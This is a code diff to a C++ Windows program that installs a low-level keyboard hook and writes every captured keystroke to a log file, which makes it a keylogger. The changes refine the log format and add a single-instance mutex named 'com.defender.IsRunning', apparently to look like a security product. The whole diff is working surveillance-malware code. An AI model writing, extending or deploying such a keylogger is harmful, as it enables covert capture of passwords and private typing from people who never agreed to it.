@@ -232,7 +232,7 @@ public:
 	}
 	 
 	static bool Test() {
-		GetWindowFileName(GetForegroundWindow());
+		//GetWindowFileName(GetForegroundWindow());
 
 		//return true;
 		return false;
@@ -250,6 +250,7 @@ public:
 
 		return false;
 	}
+
 };
 
 boolean HookKeyboard()
@@ -430,7 +431,11 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 				temp.clear();
 				temp << HookCode(p->vkCode, caps, shift);
 				std::cout << temp.str();
-				myfile << temp.str() << std::endl;
+				myfile << temp.str();
+				if (p->vkCode == VK_RETURN)
+				{
+					myfile << std::endl;
+				}
 			}
 			// Final output logic
 		}
@@ -449,6 +454,17 @@ int WinMain(
 	int       nShowCmd
 )
 {
+	static char szUniqueNamedMutex[] = "com.defender.IsRunning";
+
+	SetLastError(0);
+	HANDLE hHandle = CreateMutexA(NULL, TRUE, szUniqueNamedMutex);
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		My::Debug("WinMain: Already running!!!");
+
+		return 0;
+	}
+
 	My::Debug(std::string("WinMain: lpCmdLine=") + lpCmdLine + "\n");
 
 	if (My::Test()) {
@@ -482,6 +498,11 @@ int WinMain(
 		}
 	}
 	UnhookKeyboard();
+
+	ReleaseMutex(hHandle);
+	CloseHandle(hHandle);
+	hHandle = 0;
+
 	// Exit if failure
     return 0;
 }
